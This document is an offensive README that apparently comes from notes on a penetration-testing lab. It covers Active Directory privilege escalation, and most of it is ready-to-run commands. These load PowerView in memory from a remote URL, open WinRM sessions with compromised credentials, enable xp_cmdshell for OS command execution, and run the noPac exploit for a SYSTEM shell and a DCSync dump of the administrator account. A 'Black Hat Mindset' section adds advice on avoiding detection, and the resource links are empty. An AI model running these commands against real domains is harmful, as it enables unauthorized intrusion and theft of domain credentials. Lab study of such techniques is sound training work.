# Active Directory Privileged Access

This README focuses on enumerating privileged groups, establishing remote sessions, exploiting SQL servers, and leveraging vulnerabilities like noPac/Sam_The_Admin to gain high-privilege access.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumerating Privileged Groups](#enumerating-privileged-groups)
- [Establishing Remote Sessions](#establishing-remote-sessions)
- [Exploiting SQL Servers](#exploiting-sql-servers)
- [Exploiting noPac/Sam_The_Admin Vulnerability](#exploiting-nopac-sam-the-admin-vulnerability)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Privileged access in Active Directory environments allows attackers to escalate from user-level access to SYSTEM or domain admin privileges. This guide covers enumerating privileged groups, establishing remote sessions with WinRM and PowerShell, exploiting SQL servers for command execution, and using the noPac/Sam_The_Admin exploit to perform DCSync attacks. Commands are executed from Windows or Linux hosts, assuming you have compromised credentials (e.g., `INLANEFREIGHT\forend:Klmcargo2`).

## Setup and Prerequisites

- **Environment**: Windows host for PowerView, PowerUpSQL, and PowerShell; Linux host for Impacket, evil-winrm, and noPac.
- **PowerView**: Load into memory on Windows:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
  ```
- **PowerUpSQL**: Download `PowerUpSQL.ps1` on Windows (e.g., from its GitHub repo) and place in your working directory.
- **Impacket**: Install on Linux: `pip install impacket`
- **evil-winrm**: Install on Linux: `gem install evil-winrm`
- **noPac**: Clone the repository on Linux (see steps below)
- **PowerShell**: Run with appropriate privileges on Windows (right-click > "Run as Administrator")
- **Credentials**: Use compromised credentials (e.g., `INLANEFREIGHT\forend:Klmcargo2`, `inlanefreight\damundsen:SQL1234!`)
- **Network Access**: Ensure connectivity to target hosts (e.g., 172.16.5.5, 172.16.5.150, 10.129.201.234)

## Enumerating Privileged Groups

Identify users in privileged groups that provide access to critical systems.

```powershell
# Enumerate Remote Desktop Users group
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

# Enumerate Remote Management Users group
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

## Establishing Remote Sessions

Gain remote access to target systems using compromised credentials.

```powershell
# Create SecureString password object
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force

# Create PSCredential object
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

# Establish PowerShell session
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```

```bash
# Establish WinRM session using evil-winrm
evil-winrm -i 10.129.201.234 -u forend
```

## Exploiting SQL Servers

Access and exploit SQL servers to execute OS commands.

```powershell
# Import PowerUpSQL
Import-Module .\PowerUpSQL.ps1

# Enumerate SQL Server instances
Get-SQLInstanceDomain

# Query SQL Server version
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

```bash
# Use mssqlclient.py
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

# In mssqlclient.py shell
SQL> help
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

## Exploiting noPac/Sam_The_Admin Vulnerability

Exploit the noPac/Sam_The_Admin vulnerability to gain SYSTEM access or perform DCSync attacks.

```bash
# Clone noPac repository
sudo git clone https://github.com/Ridter/noPac.git

# Check if DC is vulnerable
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Exploit for SYSTEM shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# Exploit for DCSync attack
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

## Black Hat Mindset

- **Target Privileged Groups**: Enumerate groups like "Remote Desktop Users" to identify accounts for lateral movement.
- **Exploit SQL Access**: Use SQL Server misconfigurations (e.g., `xp_cmdshell`) to execute commands and escalate privileges.
- **Leverage Vulnerabilities**: Exploit noPac/Sam_The_Admin to gain SYSTEM shells or extract domain admin credentials.
- **Stay Silent**: Use in-memory tools and minimize network noise to avoid detection during remote access.

## Resources

- [PowerView Documentation]()
- [PowerUpSQL GitHub]()
- [Impacket Guide]()
- [evil-winrm GitHub]()
- [noPac GitHub]()
- [SQL Server Attacks]()

